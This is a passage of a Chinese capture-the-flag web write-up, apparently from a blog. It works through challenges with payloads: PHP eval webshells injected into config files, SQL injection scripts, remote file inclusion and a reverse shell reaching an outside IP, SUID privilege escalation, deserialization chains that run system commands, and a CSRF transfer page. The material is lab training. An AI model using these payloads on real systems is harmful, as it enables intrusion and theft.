/dev/null&quot;&#x27; 123.60.42.113 6663</span><br></pre></td></tr></table></figure><br>此时就是完整的shell</p>
<h2 id="6-UploadRce"><a href="#6-UploadRce" class="headerlink" title="6.UploadRce"></a>6.UploadRce</h2><p>通过备份文件信息泄露得到:<br>.index.php.swp</p>
<p>index.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$str</span> != <span class="literal">NULL</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;:Where is the source code of config.php?&#x27;</span>;</span><br><span class="line">   &#125;   </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>); </span><br></pre></td></tr></table></figure></p>
<p>.config.php.swp<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;chinfo&#x27;;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file = preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;, &quot;\$option=&#x27;$str&#x27;;&quot;, $file);</span><br></pre></td></tr></table></figure>
<p>将字符串<code>$option=&#39;任意内容&#39;;</code>替换为`$option=’$str’;<br>简单本地fuzz一下：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?option=\&#x27;;phpinfo();?&gt;</span><br><span class="line">经过addslashes函数处理后的结果:</span><br><span class="line">$str=\\\&#x27;;phpinfo();?&gt;</span><br><span class="line">经过preg_replace函数的替换,config.php里的文件从</span><br><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;chinfo&#x27;;</span><br><span class="line">变成:</span><br><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;\\\&#x27;;phpinfo();?&gt;&#x27;;</span><br><span class="line">等于:</span><br><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;\\&#x27;;phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><br>此时正好闭合前面的单引号,后面随便插入php语句<br>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&#x27;;&lt;?php eval(@$_POST[a]); ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>payload2:<br>借鉴官方的wp:用换行符绕过正则匹配<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?option= a&#x27;;%0a?&gt;&lt;?php eval(@$_POST[a]); ?&gt;;//</span><br></pre></td></tr></table></figure><br>此时config.php为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27; a\&#x27;;</span><br><span class="line">?&gt;&lt;?php eval(@$_POST[a]); ?&gt;;//&#x27;;</span><br></pre></td></tr></table></figure><br>再让a回复正常,此时传option不会影响shell:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?option=a</span><br></pre></td></tr></table></figure><br>config.php:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27; a&#x27;;</span><br><span class="line">?&gt;&lt;?php eval(@$_POST[a]); ?&gt;;//&#x27;;</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/07/08/x5sAuGbJ4lDd7j9.png" alt="屏幕截图 2023-07-08 214451.png"></p>
<h2 id="7-WelcomeSQL"><a href="#7-WelcomeSQL" class="headerlink" title="7.WelcomeSQL"></a>7.WelcomeSQL</h2><p>简单数字型sql注入,和sqli-labs第二关一样</p>
<h2 id="8-noobsql"><a href="#8-noobsql" class="headerlink" title="8.noobsql"></a>8.noobsql</h2><p>二次注入:<br>官方wp<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select &quot;&quot; into outfile &#x27;//var//www//html//111.php&#x27; #</span><br></pre></td></tr></table></figure></p>
<h2 id="9-easysql"><a href="#9-easysql" class="headerlink" title="9.easysql"></a>9.easysql</h2><p>提⽰机器⼈查看robots.txt 继续 t1ips.php 给了sql查询语句 直接写脚本爆破密码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> datetime  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://easysql.challenge.sycsec.com/login.php&#x27;</span>  </span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm-&#x27;</span>  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:  </span><br><span class="line">        data = &#123;  </span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;vanzy&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;secretpass&quot;</span>: <span class="string">f&quot;1&#x27;/**/or/**/if(secretpass/**/like/**/&#x27;<span class="subst">&#123;flag + i&#125;</span>%&#x27;,sleep(3),1)#&quot;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">        time1 = datetime.datetime.now()  </span><br><span class="line">        res = requests.post(url, data=data)  </span><br><span class="line">        time2 = datetime.datetime.now()  </span><br><span class="line">        difference = (time2 - time1).seconds  </span><br><span class="line">        <span class="keyword">if</span> difference &gt; <span class="number">1</span>:  </span><br><span class="line">            flag = flag + i  </span><br><span class="line">            <span class="built_in">print</span>(flag)  </span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<h2 id="10-justphp"><a href="#10-justphp" class="headerlink" title="10.justphp"></a>10.justphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> (<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sleeptime</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;SleepTime&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$sleeptime</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$sleeptime</span>))</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;时间是一个数字啊喂！&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$sleeptime</span> &lt; <span class="number">86400</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;这点时间哪够Canzik学长睡啊&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$sleeptime</span> &gt; <span class="number">86400</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;别让Canzik学长睡死在这啊！&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;Canzik学长很满足,表示这次把这辈子的觉都睡完啦！flag在这,自己拿吧:&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">sleep</span>((<span class="keyword">int</span>)<span class="variable">$sleeptime</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>86400*30=2592000,科学计数法:2.592e6,十六进制:0x27ac40</code><br>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?SleepTime=2.6e6</span><br></pre></td></tr></table></figure></p>
<h2 id="11-ezrfi"><a href="#11-ezrfi" class="headerlink" title="11.ezrfi"></a>11.ezrfi</h2><p>经过简单fuzz可以知道替换了<a href="http://还在后面加个.html后缀名,通过url参数的?file可以猜测是文件包含">http://还在后面加个.html后缀名,通过url参数的?file可以猜测是文件包含</a><br>在vps或者虚拟机上挂个shell.html<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#x27;rfi&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>修改url:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=hthttp://tp://123.60.42.113/shell</span><br></pre></td></tr></table></figure><br>在post可以执行命令也可以蚁剑连上<br><img src="https://s2.loli.net/2023/07/08/sSaNG5hxUXpYmni.png" alt="屏幕截图 2023-07-08 231223.png"></p>
<h2 id="12-babyupload"><a href="#12-babyupload" class="headerlink" title="12.babyupload"></a>12.babyupload</h2><p>⽆过滤上传⼀句话⽊⻢即可</p>
<h2 id="13-来发个包"><a href="#13-来发个包" class="headerlink" title="13.来发个包"></a>13.来发个包</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> uname = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ifflag&#x27;</span>).<span class="property">value</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> param = <span class="string">&#x27;ifffflag=&#x27;</span>+uname;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;flag.php&#x27;</span>,<span class="literal">true</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="title function_">send</span>(param);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span>(xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="title function_">alert</span>(xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> --&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码被注释了，⼤致意思就是给flag.php以post的⽅式发送⼀个ifffflag=flag就能拿到flag，所以这⾥可以⽤hackbar/burp构造请求 包getflag</p>
<h2 id="14-Can-Can-Need"><a href="#14-Can-Can-Need" class="headerlink" title="14.Can Can Need"></a>14.Can Can Need</h2><p>伪造IP:Client-Ip: 127.0.0.1<br>Referer: sycsec.com<br>伪造UA:User-Agent: Syclover Browser<br>伪造邮箱 From: VanZY@Syclover.com</p>
<p>补:<br>伪造代理可以用Via</p>
<h2 id="15-ezrce"><a href="#15-ezrce" class="headerlink" title="15.ezrce"></a>15.ezrce</h2><p>前面那段离谱的注释是与佛论禅编码<br>但是这里的开头是 <code>佛又曰</code><br>所以应该是 <code>与佛论禅重制版V2</code><br>在这个网站:<a href="https://tools.takuron.top/talk-with-buddha/">https://tools.takuron.top/talk-with-buddha/</a><br>里得到新佛曰:<br>再在这个网站:<a href="http://hi.pcmoe.net/Buddha.html">http://hi.pcmoe.net/Buddha.html</a><br>得到:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我都懂，我都明白，我是没有策略的防火墙，是被无限绕过的WAF，是扫不出马的EDR，是丢流量的探针，是没升级的态势感知，我守不住内网，也守不住你。#flag或许会在当前目录#</span><br></pre></td></tr></table></figure><br>;可以先执行前面后执行后面<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=l;b=s;$a$b</span><br></pre></td></tr></table></figure><br>看到有个may_b3_y0u_can_pr0t3ct.php</p>
<p>拼接cat${IFS}may_b3_y0u_can_pr0t3ct.php:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=ca;b=t;c=may_b3_y0u_can_pr0t3ct.ph;d=p;$a$b$&#123;IFS&#125;$c$d</span><br></pre></td></tr></table></figure></p>
<p>SYC{y0u_n33d_a_g1rfr1nd}</p>
<h2 id="16-Not-Stay"><a href="#16-Not-Stay" class="headerlink" title="16.Not_Stay"></a>16.Not_Stay</h2><p>考点:exit死亡绕过</p>
<p><img src="https://s2.loli.net/2023/07/09/dRDxf7lXaWihNpr.png" alt="屏幕截图 2023-07-09 195723.png"></p>
<p>分析源码：</p>
<ol>
<li>uuid函数就是给<code>$_COOKIE</code>变量加个随机值</li>
<li>有两个file_put_contents函数,第一个写内容到/tmp/uuid()生成的值.x里,但是镜像没用这个.x导致了非预期解,第二个file_put_contents函数往filename里写<code>&#39;&lt;?php exit();?&gt;&#39;.$file_data</code></li>
<li>这里的waf.php里有exif_imagetype函数,是检查是否有GIF89a或PNG标识的</li>
<li>第二个file_put_contents需要绕过exit<br>首先绕过exit可以直接用base64编码的方式,但是base64只能识别64个字符<code>[a-z0-9A-Z+]</code>, 将会被识别为 phpexit ,解码以4byte⼀ 组,由于我们不知道它使用的什么字符编码,也不知道一个字母数字对应多少个字节,可以不断在GIF89a和shell的base64编码之间加字母试探<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=php://filter/convert.base64- decode/resource=/var/www/html/upload/df405a9-1c31-b8c5-8ce8-36e846421f33/shell.php&amp;data=GIF89aasdPD9waHAgQGV2YWwoJ F9QT1NUWycxMjMnXSk/Pg==</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>非预期解:利用第一个file_put_contents<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">data=&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;</span><br><span class="line">Cookie:</span><br><span class="line">path=../var/www/html/upload/test.php</span><br></pre></td></tr></table></figure></p>
<h2 id="17-easyphp"><a href="#17-easyphp" class="headerlink" title="17.easyphp"></a>17.easyphp</h2><p>提示备份文件,得到源码,简单pop链子绕过wakeup<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:15:&quot;BillyHerrington&quot;:1:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:17:&quot;system(&#x27;whoami&#x27;);&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line">O:15:&quot;BillyHerrington&quot;:1:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:26:&quot;system(&#x27;cat /flagishere&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="18-edit-php"><a href="#18-edit-php" class="headerlink" title="18.edit_php"></a>18.edit_php</h2><p>考点：</p>
<ol>
<li>类似ueditor的任意⽂件上传。</li>
<li>提权<br>抓包发现catchImg.php?file_url=example.jpg<br>访问catchImg.php出现源码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_COOKIE[&#x27;path&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /index.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $path = $_COOKIE[&#x27;path&#x27;];</span><br><span class="line">    if(!is_dir(&#x27;upload/&#x27;.$path))&#123;</span><br><span class="line">        mkdir(&#x27;upload/&#x27;.$path);</span><br><span class="line">        chmod(&#x27;upload/&#x27;.$path,0755);</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $uri = parse_url($str, 5);</span><br><span class="line">        $checklist = [&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;];</span><br><span class="line">        $ext = substr($uri,strpos($uri,&quot;.&quot;)+1);</span><br><span class="line">        if(in_array($ext,$checklist))&#123;</span><br><span class="line">            return $uri;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;file_url&#x27;]))&#123;</span><br><span class="line">            $contents = file_get_contents($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">            $ext = substr($_GET[&#x27;file_url&#x27;], strrpos($_GET[&#x27;file_url&#x27;], &quot;.&quot;) + 1);</span><br><span class="line">            $uri = waf($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">            if($uri !== &quot;&quot;)&#123;</span><br><span class="line">                $file_name = substr($uri,&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1,strpos($uri,&#x27;.&#x27;)-(&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1));</span><br><span class="line">                file_put_contents(&#x27;upload/&#x27;.$path.&#x27;/&#x27;.md5($file_name).&#x27;.&#x27;.$ext,$contents);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;no resource!&quot;;</span><br><span class="line">        header(&quot;Location: /index.php&quot;);</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;refresh: 0;url=/showImage.php&quot;);</span><br><span class="line">echo &quot;success&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
分析:</li>
<li>waf函数用strpos(从左往右第一个)检查后缀名是否是png,jpg,gif</li>
<li>ext变量是从右往左得到后缀名,最后的file_put_contents也是这么直接拼接ext变量的,所以可以用test.png?.php绕过waf函数的限制<br>vps上挂个马命名为test.png,<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file_url=http://ip/test.png?.php</span><br></pre></td></tr></table></figure>
连上蚁剑，无法读取flag的内容需要提权<br>虚拟终端：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">发现这里有 dd 命令</span><br><span class="line"></span><br><span class="line">直接用 dd if=/f1ag_is_here_y0u_k0nw 读取flag</span><br></pre></td></tr></table></figure>
<h2 id="19-ezrequest"><a href="#19-ezrequest" class="headerlink" title="19.ezrequest"></a>19.ezrequest</h2>考点：python的爬虫。re，request模块<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">s=requests.session()  </span><br><span class="line">s.keep_alive=<span class="literal">False</span>  </span><br><span class="line">get_url=<span class="string">&#x27;http://testphp:12/?action=index&#x27;</span>  </span><br><span class="line">post_url=<span class="string">&#x27;http://testphp:12/?action=check&#x27;</span>  </span><br><span class="line">r=s.get(url=get_url,verify=<span class="literal">False</span>)  </span><br><span class="line">get_cookie=r.cookies  </span><br><span class="line"><span class="comment">#print(get_cookie)  </span></span><br><span class="line">matched=re.search(<span class="string">&#x27;依梦学姐觉得这个课更好摸鱼:([\d]+)号([\u4e00-\u9fa5]+)&#x27;</span>,r.text.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))  </span><br><span class="line">_num=matched.group(<span class="number">1</span>)  </span><br><span class="line">_<span class="keyword">class</span>=matched.group(<span class="number">2</span>)  </span><br><span class="line"><span class="built_in">print</span>(_num,_<span class="keyword">class</span>)  </span><br><span class="line">data=&#123;  </span><br><span class="line">    <span class="string">&#x27;num&#x27;</span>:_num,  </span><br><span class="line">    <span class="string">&#x27;class&#x27;</span>:_<span class="keyword">class</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">&#125;  </span><br><span class="line">response=requests.post(url=post_url,data=data,cookies=get_cookie)  </span><br><span class="line"><span class="built_in">print</span>(response.text)  </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> response.cookies:  </span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>
结果:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23 舞龙舞狮</span><br><span class="line">抢到了!依梦学姐很满意并送了你一块小饼干</span><br><span class="line">&lt;Cookie flag=SYC&#123;just_@_ez_requ3st&#125; for testphp.local/&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="20-login-into-my-heart"><a href="#20-login-into-my-heart" class="headerlink" title="20.login_into_my_heart"></a>20.login_into_my_heart</h2><p>考点:<br>字符增多的反序列化字符逃逸<br>经过提示的base64解码可以得到:<br>O:3:”Log”:3:{s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:8:”username”;s:5:”hacker”;s:7:”islogin”;i:0;}<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin-&gt;hacker 数量还是5,逃逸了一个字符</span><br><span class="line">构造payload:&quot;;s:7:&quot;islogin&quot;;i:1;&#125;一共21个字符</span><br><span class="line">输入21个admin就能逃逸出去payload:</span><br><span class="line">最终payload:</span><br><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:7:&quot;islogin&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="21-登录试试"><a href="#21-登录试试" class="headerlink" title="21.登录试试"></a>21.登录试试</h2><p>md5加密密码爆破</p>
<h2 id="22-drinktea"><a href="#22-drinktea" class="headerlink" title="22.drinktea"></a>22.drinktea</h2><p>考点：CSRF漏洞,php伪随机数漏洞<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">//真的随机吗？</span><br><span class="line">$seed = file_get_contents(&quot;/seed&quot;);</span><br><span class="line">mt_srand($seed);</span><br><span class="line">mt_rand();// == 1567320364</span><br><span class="line">mt_rand();</span><br><span class="line">mt_rand();</span><br><span class="line">mt_rand();</span><br><span class="line">mt_rand();</span><br><span class="line">mt_rand();</span><br><span class="line">$code = md5(mt_rand());</span><br><span class="line">echo file_get_contents(&quot;random.php&quot;);</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure><br>PHP伪随机数漏洞,可以看这篇<a href="https://blog.csdn.net/qq_58784379/article/details/121715072">(143条消息) PHP伪随机数漏洞，以及php_mt_seed脚本的使用_php_mt_seed.c_sGanYu的博客-CSDN博客</a><br>使用:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./php_mt_seed 1567320364 </span><br><span class="line">Pattern: EXACT</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xa8000000 - 0xabffffff, speed 21681.3 Mseeds/s </span><br><span class="line">seed = 0xaa4cbfec = 2857156588 (PHP 3.0.7 to 5.2.0)</span><br><span class="line">seed = 0xaa4cbfed = 2857156589 (PHP 3.0.7 to 5.2.0)</span><br><span class="line">Found 2, trying 0xfc000000 - 0xffffffff, speed 22251.9 Mseeds/s </span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 2, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s </span><br><span class="line">seed = 0x000a2c2a = 666666 (PHP 7.1.0+)</span><br><span class="line">Found 3, trying 0x16000000 - 0x17ffffff, speed 251.1 Mseeds/s </span><br><span class="line">seed = 0x16b73644 = 381105732 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">Found 4, trying 0xbe000000 - 0xbfffffff, speed 249.6 Mseeds/s </span><br><span class="line">seed = 0xbf3e7fc3 = 3208544195 (PHP 7.1.0+)</span><br><span class="line">Found 5, trying 0xfe000000 - 0xffffffff, speed 249.2 Mseeds/s </span><br><span class="line">Found 5</span><br></pre></td></tr></table></figure></p>
<p>找到666666,利用上面的php代码生产验证码,根据留言提示可知利用反馈页面进行csrf攻击,来根据转账页面伪造转账来赚米,vps放csrf.html<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;form action=&quot;&lt;http://mc.vveelin.com.cn:8102/trans.php&gt;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;user&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;999999999999&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script language=javascript&gt;</span><br><span class="line">setTimeout(&quot;document.forms[0].submit()&quot;,1000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>然后让对方访问这个html文件,到账买双皮奶拿flag</p>
<h2 id="23-LoveSyc"><a href="#23-LoveSyc" class="headerlink" title="23.LoveSyc"></a>23.LoveSyc</h2><p>源代码</p>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>HDCTF2023</title>
    <url>/2024/02/06/HDCTF%202023/</url>
    <content><![CDATA[<h2 id="1-Welcome-To-HDCTF-2023"><a href="#1-Welcome-To-HDCTF-2023" class="headerlink" title="1.Welcome To HDCTF 2023"></a>1.Welcome To HDCTF 2023</h2><p>在game.js里发现奇怪的seeeeeeeecret,不难看出就是jsfuck<br>直接把它放在控制台输出或者jsfuck解码<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;We13ome_t@_HDCTF_2o23&#125;</span><br></pre></td></tr></table></figure></p>
